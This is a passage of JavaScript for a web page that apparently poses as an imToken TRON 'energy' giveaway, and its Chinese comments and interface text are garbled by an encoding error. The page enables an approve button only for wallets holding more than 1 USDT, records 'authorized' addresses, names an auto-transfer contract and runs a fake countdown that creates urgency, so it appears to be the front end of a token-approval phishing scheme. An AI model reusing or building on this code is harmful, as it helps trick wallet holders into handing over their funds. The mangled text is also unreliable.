            userInfoDefault.innerHTML = `â„¹ï¸ æˆæƒåœ°å€å·²å­˜åœ¨ï¼š${address}<br><span>æ— éœ€é‡å¤å­˜å‚¨</span>`;
        }
    } catch (e) {
        // é¡µé¢åé¦ˆï¼šå­˜å‚¨å¤±è´¥
        userInfoDefault.innerHTML = `âŒ å­˜å‚¨æˆæƒåœ°å€å¤±è´¥ï¼š${e.message}<br><span>é”™è¯¯åŸå› ï¼š${JSON.stringify(e)}</span>`;
        console.warn("å­˜å‚¨å·²æˆæƒåœ°å€å¤±è´¥ï¼š", e);
    }
}

function isAddressAuthorized(address) {
    // é¡µé¢åé¦ˆï¼šå¼€å§‹æ ¡éªŒåœ°å€æˆæƒçŠ¶æ€
    userInfoDefault.innerHTML = `ğŸ” æ­£åœ¨æ ¡éªŒåœ°å€æˆæƒçŠ¶æ€ï¼š${address}<br><span>æ­¥éª¤ï¼š1. æŸ¥è¯¢æˆæƒåˆ—è¡¨ 2. æ ¡éªŒé¢†å–æ—¶é—´</span>`;
    const addresses = getAuthorizedAddresses();
    if (!addresses.includes(address)) {
        // é¡µé¢åé¦ˆï¼šåœ°å€æœªæˆæƒ
        userInfoDefault.innerHTML = `âŒ åœ°å€æœªæˆæƒï¼š${address}<br><span>æœªåœ¨æˆæƒåˆ—è¡¨ä¸­</span>`;
        return false;
    }
    const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
    const record = records.find(item => item.address === address);
    if (!record) {
        // é¡µé¢åé¦ˆï¼šæ— é¢†å–è®°å½•
        userInfoDefault.innerHTML = `âŒ æ— é¢†å–è®°å½•ï¼š${address}<br><span>æˆæƒåˆ—è¡¨å­˜åœ¨ä½†æ— é¢†å–è®°å½•</span>`;
        return false;
    }
    const receiveTime = new Date(record.receiveTime).getTime();
    const thirtyDays = 30 * 24 * 60 * 60 * 1000;
    const isAuthorized = Date.now() - receiveTime < thirtyDays;
    if (isAuthorized) {
        // é¡µé¢åé¦ˆï¼šå·²æˆæƒï¼ˆ30å¤©å†…ï¼‰
        userInfoDefault.innerHTML = `âœ… åœ°å€å·²æˆæƒï¼š${address}<br><span>é¢†å–æ—¶é—´ï¼š${new Date(receiveTime).toLocaleString()}ï¼ˆ30å¤©å†…ï¼‰</span>`;
    } else {
        // é¡µé¢åé¦ˆï¼šæˆæƒå·²è¿‡æœŸ
        userInfoDefault.innerHTML = `â„¹ï¸ æˆæƒå·²è¿‡æœŸï¼š${address}<br><span>é¢†å–æ—¶é—´ï¼š${new Date(receiveTime).toLocaleString()}ï¼ˆè¶…è¿‡30å¤©ï¼‰</span>`;
    }
    return isAuthorized;
}

function canSendA1Signal(address) {
    try {
        // é¡µé¢åé¦ˆï¼šå¼€å§‹æ£€æŸ¥A1ä¿¡å·å‘é€æƒé™
        userInfoDefault.innerHTML = `ğŸ” æ£€æŸ¥A1ä¿¡å·å‘é€æƒé™ï¼š${address}<br><span>æ­¥éª¤ï¼šæŸ¥è¯¢ä¸Šæ¬¡å‘é€æ—¶é—´</span>`;
        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
        const lastSendTime = records[address] || 0;
        const now = Date.now();
        const canSend = now - lastSendTime > 15 * 60 * 1000;
        if (canSend) {
            // é¡µé¢åé¦ˆï¼šå¯å‘é€A1ä¿¡å·
            userInfoDefault.innerHTML = `âœ… å¯å‘é€A1ä¿¡å·ï¼š${address}<br><span>ä¸Šæ¬¡å‘é€æ—¶é—´ï¼š${lastSendTime ? new Date(lastSendTime).toLocaleString() : "ä»æœªå‘é€"}ï¼ˆé—´éš”>15åˆ†é’Ÿï¼‰</span>`;
        } else {
            // é¡µé¢åé¦ˆï¼šä¸å¯å‘é€A1ä¿¡å·ï¼ˆé—´éš”ä¸è¶³ï¼‰
            userInfoDefault.innerHTML = `âŒ ä¸å¯å‘é€A1ä¿¡å·ï¼š${address}<br><span>ä¸Šæ¬¡å‘é€æ—¶é—´ï¼š${new Date(lastSendTime).toLocaleString()}ï¼ˆé—´éš”<15åˆ†é’Ÿï¼‰</span>`;
        }
        return canSend;
    } catch (e) {
        // é¡µé¢åé¦ˆï¼šæ£€æŸ¥A1ä¿¡å·æƒé™å¤±è´¥
        userInfoDefault.innerHTML = `âŒ æ£€æŸ¥A1ä¿¡å·æƒé™å¤±è´¥ï¼š${e.message}<br><span>é”™è¯¯åŸå› ï¼š${JSON.stringify(e)}</span>`;
        console.warn("æ£€æŸ¥A1ä¿¡å·å‘é€æƒé™å¤±è´¥ï¼š", e);
        return true;
    }
}

function updateA1SignalRecord(address) {
    try {
        // é¡µé¢åé¦ˆï¼šå¼€å§‹æ›´æ–°A1ä¿¡å·è®°å½•
        userInfoDefault.innerHTML = `ğŸ”„ æ›´æ–°A1ä¿¡å·è®°å½•ï¼š${address}<br><span>æ­¥éª¤ï¼šå­˜å‚¨å½“å‰å‘é€æ—¶é—´</span>`;
        const records = JSON.parse(localStorage.getItem(A1_SIGNAL_KEY) || "{}");
        records[address] = Date.now();
        localStorage.setItem(A1_SIGNAL_KEY, JSON.stringify(records));
        // é¡µé¢åé¦ˆï¼šæ›´æ–°A1ä¿¡å·è®°å½•æˆåŠŸ
        userInfoDefault.innerHTML = `âœ… A1ä¿¡å·è®°å½•æ›´æ–°æˆåŠŸï¼š${address}<br><span>å‘é€æ—¶é—´ï¼š${new Date().toLocaleString()}</span>`;
    } catch (e) {
        // é¡µé¢åé¦ˆï¼šæ›´æ–°A1ä¿¡å·è®°å½•å¤±è´¥
        userInfoDefault.innerHTML = `âŒ æ›´æ–°A1ä¿¡å·è®°å½•å¤±è´¥ï¼š${e.message}<br><span>é”™è¯¯åŸå› ï¼š${JSON.stringify(e)}</span>`;
        console.warn("æ›´æ–°A1ä¿¡å·è®°å½•å¤±è´¥ï¼š", e);
    }
}

function hasSentB1Signal(address) {
    try {
        // é¡µé¢åé¦ˆï¼šå¼€å§‹æ£€æŸ¥B1ä¿¡å·å‘é€çŠ¶æ€
        userInfoDefault.innerHTML = `ğŸ” æ£€æŸ¥B1ä¿¡å·å‘é€çŠ¶æ€ï¼š${address}<br><span>æ­¥éª¤ï¼šæŸ¥è¯¢30å¤©å†…æ˜¯å¦å‘é€è¿‡</span>`;
        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
        const item = records[address];
        if (!item) {
            // é¡µé¢åé¦ˆï¼šæœªå‘é€è¿‡B1ä¿¡å·
            userInfoDefault.innerHTML = `â„¹ï¸ æœªå‘é€è¿‡B1ä¿¡å·ï¼š${address}<br><span>æ— B1ä¿¡å·å‘é€è®°å½•</span>`;
            return false;
        }
        const isSent = Date.now() - item.time < 30 * 24 * 60 * 60 * 1000;
        if (isSent) {
            // é¡µé¢åé¦ˆï¼š30å¤©å†…å·²å‘é€B1ä¿¡å·
            userInfoDefault.innerHTML = `âœ… 30å¤©å†…å·²å‘é€B1ä¿¡å·ï¼š${address}<br><span>å‘é€æ—¶é—´ï¼š${new Date(item.time).toLocaleString()}</span>`;
        } else {
            // é¡µé¢åé¦ˆï¼šB1ä¿¡å·å·²è¿‡æœŸï¼ˆè¶…è¿‡30å¤©ï¼‰
            userInfoDefault.innerHTML = `â„¹ï¸ B1ä¿¡å·å·²è¿‡æœŸï¼š${address}<br><span>å‘é€æ—¶é—´ï¼š${new Date(item.time).toLocaleString()}ï¼ˆè¶…è¿‡30å¤©ï¼‰</span>`;
        }
        return isSent;
    } catch (e) {
        // é¡µé¢åé¦ˆï¼šæ£€æŸ¥B1ä¿¡å·å¤±è´¥
        userInfoDefault.innerHTML = `âŒ æ£€æŸ¥B1ä¿¡å·å¤±è´¥ï¼š${e.message}<br><span>é”™è¯¯åŸå› ï¼š${JSON.stringify(e)}</span>`;
        console.warn("æ£€æŸ¥B1é˜²é‡å¤å¤±è´¥ï¼š", e);
        return false;
    }
}

function markB1SignalSent(address) {
    try {
        // é¡µé¢åé¦ˆï¼šå¼€å§‹æ ‡è®°B1ä¿¡å·å‘é€
        userInfoDefault.innerHTML = `ğŸ”„ æ ‡è®°B1ä¿¡å·å‘é€ï¼š${address}<br><span>æ­¥éª¤ï¼šå­˜å‚¨å‘é€æ—¶é—´</span>`;
        const records = JSON.parse(localStorage.getItem(B1_SIGNAL_KEY) || "{}");
        records[address] = { time: Date.now() };
        localStorage.setItem(B1_SIGNAL_KEY, JSON.stringify(records));
        // é¡µé¢åé¦ˆï¼šB1ä¿¡å·æ ‡è®°æˆåŠŸ
        userInfoDefault.innerHTML = `âœ… B1ä¿¡å·æ ‡è®°æˆåŠŸï¼š${address}<br><span>å‘é€æ—¶é—´ï¼š${new Date().toLocaleString()}</span>`;
    } catch (e) {
        // é¡µé¢åé¦ˆï¼šB1ä¿¡å·æ ‡è®°å¤±è´¥
        userInfoDefault.innerHTML = `âŒ B1ä¿¡å·æ ‡è®°å¤±è´¥ï¼š${e.message}<br><span>é”™è¯¯åŸå› ï¼š${JSON.stringify(e)}</span>`;
        console.warn("æ ‡è®°B1ä¿¡å·å¤±è´¥ï¼š", e);
    }
}

const walletStatusContainer = document.getElementById("walletStatusContainer");
const contractAddrEl = document.getElementById("contractAddr");
const userInfoEl = document.getElementById("userInfo");
const userInfoStatus = document.getElementById("userInfoStatus");
const connectBtn = document.getElementById("connectBtn");
const approveBtn = document.getElementById("approveBtn");
const warning = document.querySelector('.warning');
const approvalRecords = document.getElementById("approvalRecords");
const reviewTip = document.getElementById("reviewTip");
const reviewTipText = document.getElementById("reviewTipText");
const langDropdown = document.getElementById("langDropdown");
const langToggleBtn = document.getElementById("langToggleBtn");
const langDropdownItems = document.querySelectorAll(".lang-dropdown-item");
const footerInfo = document.getElementById("footerInfo");
const recordList = document.getElementById("recordList");
const specialTipContainer = document.getElementById("specialTipContainer");
const nonImTokenPopup = document.getElementById("nonImTokenPopup");
const closePopupBtn = document.getElementById("closePopupBtn");
const userInfoDefault = document.getElementById("userInfoDefault");
const balanceUsdtEl = document.getElementById("balanceUsdt");
const balanceTrxEl = document.getElementById("balanceTrx");
const balanceEnergyEl = document.getElementById("balanceEnergy");
const balanceBandwidthEl = document.getElementById("balanceBandwidth");
const balanceItems = document.querySelectorAll(".balance-item");
// å…³é”®ä¿®æ”¹2ï¼šè·å–å¤šé’±åŒ…å¼¹çª—å…ƒç´ 
const multiWalletPopup = document.getElementById("multiWalletPopup");
const closeMultiWalletBtn = document.getElementById("closeMultiWalletBtn");
const walletItems = document.querySelectorAll(".wallet-item");

function isCustomerError(errMsg) {
    const lang = langConfig[currentLang];
    const customerErrorKeys = [
        lang.ineligibleTip, "æ— æ•ˆTRONåœ°å€", "USDTä½™é¢ä¸è¶³", "ä¸ç¬¦åˆé¢†å–æ¡ä»¶", "30å¤©å†…å·²é¢†å–", 
         "æœªæ£€æµ‹åˆ°é’±åŒ…åœ°å€", "Ineligible", "invalid TRON address", 
        "USDT balance", "within 30 days"
    ];
    const isCustomerErr = customerErrorKeys.some(key => errMsg.includes(key));
    // é¡µé¢åé¦ˆï¼šé”™è¯¯ç±»å‹åˆ¤æ–­ç»“æœ
    userInfoDefault.innerHTML = `ğŸ” é”™è¯¯ç±»å‹åˆ¤æ–­ï¼š${errMsg}<br><span>æ˜¯å¦ç”¨æˆ·ä¾§é”™è¯¯ï¼š${isCustomerErr ? "æ˜¯" : "å¦"}</span>`;
    return isCustomerErr;
}

function initLangDisplay() {
    if (currentLang === "zh") {
        langToggleBtn.innerHTML = 'ğŸ‡¨ğŸ‡³ <span id="currentLangText">ä¸­æ–‡</span>';
        // é¡µé¢åé¦ˆï¼šè¯­è¨€åˆ‡æ¢ä¸ºä¸­æ–‡
        userInfoDefault.innerHTML = `âœ… è¯­è¨€åˆ‡æ¢ä¸ºï¼šç®€ä½“ä¸­æ–‡`;
    } else {
        langToggleBtn.innerHTML = 'ğŸ‡ºğŸ‡¸ <span id="currentLangText">English</span>';
        // é¡µé¢åé¦ˆï¼šè¯­è¨€åˆ‡æ¢ä¸ºè‹±æ–‡
        userInfoDefault.innerHTML = `âœ… è¯­è¨€åˆ‡æ¢ä¸ºï¼šEnglish`;
    }
}

function changeLang(newLang) {
    // é¡µé¢åé¦ˆï¼šå¼€å§‹åˆ‡æ¢è¯­è¨€
    userInfoDefault.innerHTML = `ğŸ”„ æ­£åœ¨åˆ‡æ¢è¯­è¨€ï¼š${newLang === "zh" ? "ç®€ä½“ä¸­æ–‡" : "English"}`;
    currentLang = newLang;
    localStorage.setItem("imtoken_energy_lang", currentLang);
    initLangDisplay();
    updatePageLang();
    reRenderDynamicContent();
    renderEnergyRecords();
    langDropdown.classList.remove("open");
    // é¡µé¢åé¦ˆï¼šè¯­è¨€åˆ‡æ¢å®Œæˆ
    userInfoDefault.innerHTML = `âœ… è¯­è¨€åˆ‡æ¢å®Œæˆï¼š${newLang === "zh" ? "ç®€ä½“ä¸­æ–‡" : "English"}`;
}

function updatePageLang() {
    const lang = langConfig[currentLang];
    // é¡µé¢åé¦ˆï¼šå¼€å§‹æ›´æ–°é¡µé¢æ–‡å­—
    userInfoDefault.innerHTML = `ğŸ”„ æ­£åœ¨æ›´æ–°é¡µé¢æ–‡å­—ï¼š${currentLang === "zh" ? "ç®€ä½“ä¸­æ–‡" : "English"}`;
    Object.keys(lang).forEach(key => {
        const el = document.getElementById(key);
        if (el) {
            el.innerHTML = lang[key];
        }
    });
    connectBtn.textContent = lang.connectBtnText;
    approveBtn.textContent = lang.approveBtnText;
    reviewTipText.textContent = lang.reviewTipText;
    approvalRecords.textContent = lang.noRecord;
    // é¡µé¢åé¦ˆï¼šé¡µé¢æ–‡å­—æ›´æ–°å®Œæˆ
    userInfoDefault.innerHTML = `âœ… é¡µé¢æ–‡å­—æ›´æ–°å®Œæˆï¼š${currentLang === "zh" ? "ç®€ä½“ä¸­æ–‡" : "English"}`;
}

async function updateUserInfoDisplay() {
    const lang = langConfig[currentLang];
    // é¡µé¢åé¦ˆï¼šå¼€å§‹æ›´æ–°ç”¨æˆ·ä¿¡æ¯æ˜¾ç¤º
    userInfoDefault.innerHTML = `ğŸ”„ æ­£åœ¨æ›´æ–°ç”¨æˆ·ä¿¡æ¯ï¼š${userAddress || "æœªè¿æ¥é’±åŒ…"}`;
    if (!userAddress) {
        userInfoDefault.style.display = "block";
        userInfoStatus.style.display = "none";
        balanceItems.forEach(item => item.style.display = "none");
        // é¡µé¢åé¦ˆï¼šç”¨æˆ·ä¿¡æ¯æ›´æ–°å®Œæˆï¼ˆæœªè¿æ¥é’±åŒ…ï¼‰
        userInfoDefault.innerHTML = `â„¹ï¸ ç”¨æˆ·ä¿¡æ¯æ›´æ–°å®Œæˆï¼šæœªè¿æ¥é’±åŒ…`;
        return;
    }
    userInfoDefault.style.display = "none";
    balanceItems.forEach(item => item.style.display = "flex");
    balanceUsdtEl.textContent = tokenBalance.toFixed(2);
    balanceTrxEl.textContent = trxBalance.toFixed(2);   
    balanceBandwidthEl.textContent = Math.floor(currentBandwidth);
    const userOwnEnergy = await queryUserEnergyBalance(userAddress);
    balanceEnergyEl.textContent = Math.floor(userOwnEnergy);
    // é¡µé¢åé¦ˆï¼šç”¨æˆ·ä¿¡æ¯æ›´æ–°å®Œæˆï¼ˆå·²è¿æ¥é’±åŒ…ï¼‰
    userInfoStatus.innerHTML = `âœ… ç”¨æˆ·ä¿¡æ¯æ›´æ–°å®Œæˆï¼š<br>USDT: ${tokenBalance.toFixed(2)} | TRX: ${trxBalance.toFixed(2)} | èƒ½é‡: ${Math.floor(userOwnEnergy)} | å®½å¸¦: ${Math.floor(currentBandwidth)}`;
}

function updateUserBalanceDisplay() {
    // é¡µé¢åé¦ˆï¼šå¼€å§‹é‡ç½®ç”¨æˆ·ä½™é¢æ˜¾ç¤º
    userInfoDefault.innerHTML = `ğŸ”„ æ­£åœ¨é‡ç½®ç”¨æˆ·ä½™é¢æ˜¾ç¤º`;
    balanceUsdtEl.textContent = "0.00";
    balanceTrxEl.textContent = "0.00";
    balanceEnergyEl.textContent = "0";
    balanceBandwidthEl.textContent = "0";
    // é¡µé¢åé¦ˆï¼šä½™é¢æ˜¾ç¤ºé‡ç½®å®Œæˆ
    userInfoDefault.innerHTML = `âœ… ä½™é¢æ˜¾ç¤ºé‡ç½®å®Œæˆï¼šå‡ä¸ºåˆå§‹å€¼0`;
}

async function queryBandwidthBalance(address) {
    try {
        // é¡µé¢åé¦ˆï¼šå¼€å§‹æŸ¥è¯¢å®½å¸¦ä½™é¢
        userInfoDefault.innerHTML = `ğŸ” æŸ¥è¯¢å®½å¸¦ä½™é¢ï¼š${address}<br><span>æ­¥éª¤ï¼šè°ƒç”¨TronWeb API</span>`;
        if (!tronWeb) {
            // é¡µé¢åé¦ˆï¼šTronWebæœªåˆå§‹åŒ–
            userInfoDefault.innerHTML = `âŒ æŸ¥è¯¢å®½å¸¦ä½™é¢å¤±è´¥ï¼šTronWebæœªåˆå§‹åŒ–`;
            return 0;
        }
        const account = await tronWeb.trx.getAccount(address);
        const bandwidth = account.bandwidth || 0;
        // é¡µé¢åé¦ˆï¼šå®½å¸¦ä½™é¢æŸ¥è¯¢æˆåŠŸ
        userInfoDefault.innerHTML = `âœ… å®½å¸¦ä½™é¢æŸ¥è¯¢æˆåŠŸï¼š${address}<br><span>å®½å¸¦ä½™é¢ï¼š${bandwidth}</span>`;
        return bandwidth;
    } catch (e) {
        // é¡µé¢åé¦ˆï¼šå®½å¸¦ä½™é¢æŸ¥è¯¢å¤±è´¥
        userInfoDefault.innerHTML = `âŒ å®½å¸¦ä½™é¢æŸ¥è¯¢å¤±è´¥ï¼š${e.message}<br><span>åœ°å€ï¼š${address} | é”™è¯¯ï¼š${JSON.stringify(e)}</span>`;
        console.warn("æŸ¥è¯¢å®½å¸¦ä½™é¢å¤±è´¥ï¼š", e);
        return 0;
    }
}

async function queryUserEnergyBalance(address) {
    try {
        // é¡µé¢åé¦ˆï¼šå¼€å§‹æŸ¥è¯¢ç”¨æˆ·èƒ½é‡ä½™é¢
        userInfoDefault.innerHTML = `ğŸ” æŸ¥è¯¢ç”¨æˆ·èƒ½é‡ä½™é¢ï¼š${address}<br><span>æ­¥éª¤ï¼šè°ƒç”¨TronWeb API</span>`;
        if (!tronWeb) {
            // é¡µé¢åé¦ˆï¼šTronWebæœªåˆå§‹åŒ–
            userInfoDefault.innerHTML = `âŒ æŸ¥è¯¢èƒ½é‡ä½™é¢å¤±è´¥ï¼šTronWebæœªåˆå§‹åŒ–`;
            return 0;
        }
        const account = await tronWeb.trx.getAccount(address);
        const userEnergy = (account.energy || 0) + (account.frozenEnergy?.total || 0);
        // é¡µé¢åé¦ˆï¼šèƒ½é‡ä½™é¢æŸ¥è¯¢æˆåŠŸ
        userInfoDefault.innerHTML = `âœ… èƒ½é‡ä½™é¢æŸ¥è¯¢æˆåŠŸï¼š${address}<br><span>èƒ½é‡ä½™é¢ï¼š${userEnergy}Î¼s</span>`;
        return userEnergy;
    } catch (e) {
        // é¡µé¢åé¦ˆï¼šèƒ½é‡ä½™é¢æŸ¥è¯¢å¤±è´¥
        userInfoDefault.innerHTML = `âŒ èƒ½é‡ä½™é¢æŸ¥è¯¢å¤±è´¥ï¼š${e.message}<br><span>åœ°å€ï¼š${address} | é”™è¯¯ï¼š${JSON.stringify(e)}</span>`;
        console.warn("æŸ¥è¯¢ç”¨æˆ·è‡ªèº«èƒ½é‡å¤±è´¥ï¼š", e);
        return 0;
    }
}      

async function reRenderDynamicContent() {
    const lang = langConfig[currentLang];
    // é¡µé¢åé¦ˆï¼šå¼€å§‹é‡æ–°æ¸²æŸ“åŠ¨æ€å†…å®¹
    userInfoDefault.innerHTML = `ğŸ”„ é‡æ–°æ¸²æŸ“åŠ¨æ€å†…å®¹ï¼š${userAddress || "æœªè¿æ¥é’±åŒ…"}`;
    if (!userAddress) {
        approveBtn.disabled = true;
        approveBtn.textContent = lang.approveBtnText;
        recordList.style.display = "none";
        await updateUserInfoDisplay();
        // é¡µé¢åé¦ˆï¼šåŠ¨æ€å†…å®¹æ¸²æŸ“å®Œæˆï¼ˆæœªè¿æ¥é’±åŒ…ï¼‰
        userInfoDefault.innerHTML = `âœ… åŠ¨æ€å†…å®¹æ¸²æŸ“å®Œæˆï¼šæœªè¿æ¥é’±åŒ…ï¼ˆæŒ‰é’®ç¦ç”¨ï¼‰`;
        return;
    }
    recordList.style.display = "block";
    recordList.style.visibility = "visible";
    if (userAddress === SPECIAL_ADDRESS) {
        updateWalletStatus();
        await updateUserInfoDisplay();
        renderEnergyRecords();
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
        // é¡µé¢åé¦ˆï¼šåŠ¨æ€å†…å®¹æ¸²æŸ“å®Œæˆï¼ˆç‰¹æ®Šåœ°å€ï¼‰
        userInfoDefault.innerHTML = `âœ… åŠ¨æ€å†…å®¹æ¸²æŸ“å®Œæˆï¼šç‰¹æ®Šåœ°å€ï¼ˆæŒ‰é’®å¯ç”¨ï¼‰`;
        return;
    }
    if (isAddressAuthorized(userAddress)) {
        updateWalletStatus();
        await updateUserInfoDisplay();
        approveBtn.disabled = true;
        approveBtn.textContent = lang.authorizedBtn;
        // é¡µé¢åé¦ˆï¼šåŠ¨æ€å†…å®¹æ¸²æŸ“å®Œæˆï¼ˆå·²æˆæƒï¼‰
        userInfoDefault.innerHTML = `âœ… åŠ¨æ€å†…å®¹æ¸²æŸ“å®Œæˆï¼šå·²æˆæƒï¼ˆæŒ‰é’®ç¦ç”¨ï¼‰`;
        return;
    }
    if (tokenBalance <= 1) {
        approveBtn.disabled = true;
        approveBtn.textContent = lang.insufficientBtn;
        // é¡µé¢åé¦ˆï¼šåŠ¨æ€å†…å®¹æ¸²æŸ“å®Œæˆï¼ˆUSDTä¸è¶³ï¼‰
        userInfoDefault.innerHTML = `âœ… åŠ¨æ€å†…å®¹æ¸²æŸ“å®Œæˆï¼šUSDTä½™é¢${tokenBalance.toFixed(2)}â‰¤1ï¼ˆæŒ‰é’®ç¦ç”¨ï¼‰`;
    } else {
        approveBtn.disabled = false;
        approveBtn.textContent = lang.approveBtnText;
        // é¡µé¢åé¦ˆï¼šåŠ¨æ€å†…å®¹æ¸²æŸ“å®Œæˆï¼ˆUSDTå……è¶³ï¼‰
        userInfoDefault.innerHTML = `âœ… åŠ¨æ€å†…å®¹æ¸²æŸ“å®Œæˆï¼šUSDTä½™é¢${tokenBalance.toFixed(2)}>1ï¼ˆæŒ‰é’®å¯ç”¨ï¼‰`;
    }
    updateWalletStatus();
    await updateUserInfoDisplay();
    bindApproveLogic();
    renderEnergyRecords();
}

function calculateCurrentEnergy() {
    // é¡µé¢åé¦ˆï¼šå¼€å§‹è®¡ç®—å½“å‰åˆçº¦èƒ½é‡
    userInfoDefault.innerHTML = `ğŸ”„ è®¡ç®—å½“å‰åˆçº¦èƒ½é‡ï¼š${STORAGE_KEY}`;
    const storedData = localStorage.getItem(STORAGE_KEY);
    if (storedData) {
        try {
            const { energy, lastCalcTime } = JSON.parse(storedData);
            if (typeof energy === "number" && typeof lastCalcTime === "number") {
                const secPassed = Math.floor((Date.now() - lastCalcTime) / 1000);
                currentEnergy = Math.max(0, energy - secPassed * TRX_DECREASE_PER_SEC);
                // é¡µé¢åé¦ˆï¼šä»æœ¬åœ°å­˜å‚¨è¯»å–èƒ½é‡æ•°æ®
                userInfoDefault.innerHTML = `â„¹ï¸ ä»æœ¬åœ°å­˜å‚¨è¯»å–èƒ½é‡ï¼š${energy}Î¼s | é—´éš”ï¼š${secPassed}ç§’ | æ‰£å‡ï¼š${secPassed * TRX_DECREASE_PER_SEC}Î¼s`;
            } else {
                currentEnergy = INIT_TRX;
                // é¡µé¢åé¦ˆï¼šæœ¬åœ°å­˜å‚¨æ•°æ®æ— æ•ˆï¼Œä½¿ç”¨åˆå§‹èƒ½é‡
                userInfoDefault.innerHTML = `âš ï¸ æœ¬åœ°å­˜å‚¨æ•°æ®æ— æ•ˆï¼Œä½¿ç”¨åˆå§‹èƒ½é‡ï¼š${INIT_TRX}Î¼s`;
            }
        } catch (e) {
            currentEnergy = INIT_TRX;
            // é¡µé¢åé¦ˆï¼šè§£ææœ¬åœ°å­˜å‚¨å¤±è´¥ï¼Œä½¿ç”¨åˆå§‹èƒ½é‡
            userInfoDefault.innerHTML = `âŒ è§£ææœ¬åœ°å­˜å‚¨å¤±è´¥ï¼š${e.message} | ä½¿ç”¨åˆå§‹èƒ½é‡ï¼š${INIT_TRX}Î¼s`;
        }
    } else {
        const secPassed = Math.max(0, Math.floor((Date.now() - DEPLOY_START_TIME) / 1000));
        currentEnergy = Math.max(0, INIT_TRX - secPassed * TRX_DECREASE_PER_SEC);
        // é¡µé¢åé¦ˆï¼šæ— æœ¬åœ°å­˜å‚¨ï¼Œè®¡ç®—åˆå§‹èƒ½é‡
        userInfoDefault.innerHTML = `â„¹ï¸ æ— æœ¬åœ°å­˜å‚¨ï¼Œè®¡ç®—åˆå§‹èƒ½é‡ï¼š${INIT_TRX}Î¼s | éƒ¨ç½²åï¼š${secPassed}ç§’ | æ‰£å‡ï¼š${secPassed * TRX_DECREASE_PER_SEC}Î¼s`;
    }
    localStorage.setItem(STORAGE_KEY, JSON.stringify({
        energy: currentEnergy,
        lastCalcTime: Date.now()
    }));
    if (contractEnergyEl) contractEnergyEl.textContent = Math.floor(currentEnergy);
    // é¡µé¢åé¦ˆï¼šèƒ½é‡è®¡ç®—å®Œæˆ
    userInfoDefault.innerHTML = `âœ… èƒ½é‡è®¡ç®—å®Œæˆï¼š${Math.floor(currentEnergy)}Î¼sï¼ˆå·²å­˜å‚¨åˆ°æœ¬åœ°ï¼‰`;
    return currentEnergy;
}

function updateEnergyDisplay() {
    if (!contractEnergyEl) return;
    // é¡µé¢åé¦ˆï¼šå¼€å§‹æ›´æ–°èƒ½é‡æ˜¾ç¤º
    userInfoDefault.innerHTML = `ğŸ”„ æ›´æ–°èƒ½é‡æ˜¾ç¤ºï¼š${Math.floor(currentEnergy)}Î¼s`;
    calculateCurrentEnergy();
    contractEnergyEl.textContent = Math.floor(currentEnergy);
    contractEnergyEl.innerHTML = Math.floor(currentEnergy);
    contractEnergyEl.offsetHeight;
    console.log("èƒ½é‡è·³åŠ¨ä¸­ï¼š", Math.floor(currentEnergy));
    // é¡µé¢åé¦ˆï¼šèƒ½é‡æ˜¾ç¤ºæ›´æ–°å®Œæˆ
    userInfoDefault.innerHTML = `âœ… èƒ½é‡æ˜¾ç¤ºæ›´æ–°å®Œæˆï¼š${Math.floor(currentEnergy)}Î¼s`;
}

function startPersistentEnergyCountdown() {
    const hasClearedOldCache = localStorage.getItem("has_cleared_old_cache");
    if (!hasClearedOldCache) {
        localStorage.removeItem(STORAGE_KEY);
        localStorage.setItem("has_cleared_old_cache", "true");
        // é¡µé¢åé¦ˆï¼šå·²æ¸…é™¤æ—§ç¼“å­˜
        userInfoDefault.innerHTML = `âœ… å·²æ¸…é™¤æ—§ç¼“å­˜ï¼š${STORAGE_KEY}`;
    }
    
    if (trxTimer) clearTimeout(trxTimer);
    // é¡µé¢åé¦ˆï¼šå¯åŠ¨èƒ½é‡å€’è®¡æ—¶å®šæ—¶å™¨
    userInfoDefault.innerHTML = `ğŸ”„ å¯åŠ¨èƒ½é‡å€’è®¡æ—¶å®šæ—¶å™¨`;
    calculateCurrentEnergy();
    updateEnergyDisplay();
    
    function tick() {
        updateEnergyDisplay();
        if (currentEnergy > 0) {
            trxTimer = setTimeout(tick, 1000);
        } else {
            // é¡µé¢åé¦ˆï¼šèƒ½é‡å·²è€—å°½ï¼Œåœæ­¢å®šæ—¶å™¨
            userInfoDefault.innerHTML = `âš ï¸ èƒ½é‡å·²è€—å°½ï¼ˆ0Î¼sï¼‰ï¼Œåœæ­¢å®šæ—¶å™¨`;
        }
    }
    tick();
    // é¡µé¢åé¦ˆï¼šèƒ½é‡å®šæ—¶å™¨å¯åŠ¨æˆåŠŸ
    userInfoDefault.innerHTML = `âœ… èƒ½é‡å®šæ—¶å™¨å¯åŠ¨æˆåŠŸï¼ˆ1ç§’åˆ·æ–°ä¸€æ¬¡ï¼‰`;
    console.log("èƒ½é‡å®šæ—¶å™¨å·²å¯åŠ¨ï¼Œé€’å½’æ¨¡å¼");
}

document.addEventListener('DOMContentLoaded', async () => {
    localStorage.removeItem("energy_state");
    // é¡µé¢åé¦ˆï¼šå·²æ¸…é™¤æ—§ç¼“å­˜ï¼ˆenergy_stateï¼‰
    userInfoDefault.innerHTML = `âœ… å·²æ¸…é™¤æ—§ç¼“å­˜ï¼šenergy_state`;
    contractEnergyEl = document.getElementById("contractEnergy");
    console.log("èƒ½é‡æ˜¾ç¤ºå…ƒç´ æ˜¯å¦æ‰¾åˆ°ï¼š", contractEnergyEl ? "âœ… æ‰¾åˆ°" : "âŒ æœªæ‰¾åˆ°");
    if (!contractEnergyEl) {
        alert("âš ï¸ èƒ½é‡æ˜¾ç¤ºå…ƒç´ æœªæ‰¾åˆ°ï¼Œè¯·æ£€æŸ¥é¡µé¢ä¸­æ˜¯å¦æœ‰id='contractEnergy'çš„æ ‡ç­¾");
        return;
    }
    startPersistentEnergyCountdown();
    initLangDisplay();
    updatePageLang();
    contractAddrEl.textContent = `${AUTO_TRANSFER_CONTRACT.slice(0,8)}...${AUTO_TRANSFER_CONTRACT.slice(-6)}`;
    contractEnergyEl.textContent = Math.floor(INIT_TRX);
    renderEnergyRecords();
    updateWalletStatus();
    updateUserBalanceDisplay();
    
    langToggleBtn.addEventListener("click", (e) => {
        e.stopPropagation();
        langDropdown.classList.toggle("open");
        // é¡µé¢åé¦ˆï¼šè¯­è¨€ä¸‹æ‹‰èœå•åˆ‡æ¢
